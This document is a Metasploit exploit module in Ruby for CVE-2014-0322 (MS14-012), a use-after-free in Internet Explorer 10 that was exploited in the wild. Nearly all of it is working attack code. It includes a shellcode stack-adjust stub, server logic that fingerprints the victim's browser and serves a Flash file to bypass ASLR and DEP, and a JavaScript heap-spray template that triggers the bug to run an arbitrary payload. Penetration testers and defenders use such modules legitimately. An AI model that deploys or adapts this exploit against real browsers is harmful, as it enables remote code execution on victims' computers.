##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::BrowserExploitServer
 
  def initialize(info={})
    super(update_info(info,
      'Name'           => "MS14-012 Microsoft Internet Explorer CMarkup Use-After-Free",
      'Description'    => %q{
        This module exploits an use after free condition on Internet Explorer as used in the wild
        on the "Operation SnowMan" in February 2014. The module uses Flash Player 12 in order to
        bypass ASLR and finally DEP.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Unknown', # Vulnerability discovery and Exploit in the wild
          'Jean-Jamil Khalife', # Exploit
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2014-0322' ],
          [ 'MSB', 'MS14-012' ],
          [ 'BID', '65551' ],
          [ 'URL', 'http://www.fireeye.com/blog/technical/cyber-exploits/2014/02/operation-snowman-deputydog-actor-compromises-us-veterans-of-foreign-wars-website.html'],
          [ 'URL', 'http://hdwsec.fr/blog/CVE-2014-0322.html' ]
        ],
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Payload'        =>
        {
          'Space'          => 960,
          'DisableNops'    => true,
          'PrependEncoder' => stack_adjust
        },
      'BrowserRequirements' =>
        {
          :source      => /script|headers/i,
          :os_name     => Msf::OperatingSystems::WINDOWS,
          :os_flavor   => Msf::OperatingSystems::WindowsVersions::SEVEN,
          :ua_name     => Msf::HttpClients::IE,
          :ua_ver      => '10.0',
          :mshtml_build => lambda { |ver| ver.to_i < 16843 },
          :flash       => /^12\./
        },
      'DefaultOptions' =>
        {
          'InitialAutoRunScript' => 'migrate -f',
          'Retries'              => false
        },
      'Targets'        =>
        [
          [ 'Windows 7 SP1 / IE 10 / FP 12', { } ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Feb 13 2014",
      'DefaultTarget'  => 0))
 
  end
 
  def stack_adjust
    adjust = "\x64\xa1\x18\x00\x00\x00"  # mov eax, fs:[0x18 # get teb
    adjust << "\x83\xC0\x08"             # add eax, byte 8 # get pointer to stacklimit
    adjust << "\x8b\x20"                 # mov esp, [eax] # put esp at stacklimit
    adjust << "\x81\xC4\x30\xF8\xFF\xFF" # add esp, -2000 # plus a little offset
 
    adjust
  end
 
  def create_swf
    path = ::File.join( Msf::Config.data_directory, "exploits", "CVE-2014-0322", "AsXploit.swf" )
    fd = ::File.open( path, "rb" )
    swf = fd.read(fd.stat.size)
    fd.close
    return swf
  end
 
  def exploit
    @swf = create_swf
    super
  end
 
  def on_request_uri(cli, request)
    print_status("Request: #{request.uri}")
 
    if request.uri =~ /\.swf$/
      print_status("Sending SWF...")
      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Pragma' => 'no-cache'})
      return
    end
 
    super
  end
 
  def on_request_exploit(cli, request, target_info)
    print_status("Sending HTML...")
    send_exploit_html(cli, exploit_template(cli, target_info))
  end
 
  def exploit_template(cli, target_info)
 
    flash_payload = ""
    get_payload(cli,target_info).unpack("V*").each do |i|
      flash_payload << "0x#{i.to_s(16)},"
    end
    flash_payload.gsub!(/,$/, "")
 
    html_template = %Q|
    <html>
    <head>
    </head>
    <body>
 
    <script>
 
    var g_arr = [];
    var arrLen = 0x250;
 
    function dword2data(dword)
    {
      var d = Number(dword).toString(16);
      while (d.length < 8)
        d = '0' + d;
 
      return unescape('%u' + d.substr(4, 8) + '%u' + d.substr(0, 4));
    }
 
    function eXpl()
    {
      var a=0;
 
      for (a=0; a < arrLen; a++) {
          g_arr[a] = document.createElement('div');
      }
 
      var b = dword2data(0x19fffff3);
 
      while (b.length < 0x360) {
        if (b.length == (0x98 / 2))
        {
          b += dword2data(0x1a000010);
        }
        else if (b.length == (0x94 / 2))
        {
          b += dword2data(0x1a111111);
        }
        else if (b.length == (0x15c / 2))
        {
          b += dword2data(0x42424242);
        }
        else
        {
          b += dword2data(0x19fffff3);
        }
      }
 
      var d = b.substring(0, ( 0x340 - 2 )/2);
 
      try{
        this.outerHTML=this.outerHTML
      } catch(e){
 
      }
 
      CollectGarbage();
 
      for (a=0; a < arrLen; a++)
        {
          g_arr[a].title = d.substring(0, d.length);
        }
    }
 
    function trigger()
    {
        var a = document.getElementsByTagName("script");
        var b = a[0];
        b.onpropertychange = eXpl;
        var c = document.createElement('SELECT');
        c = b.appendChild(c);
    }
 
    </script>
    <embed src=#{rand_text_alpha(4 + rand(3))}.swf FlashVars="version=<%=flash_payload%>" width="10" height="10">
    </embed>
    </body>
    </html>
    |
 
    return html_template, binding()
  end
 
end
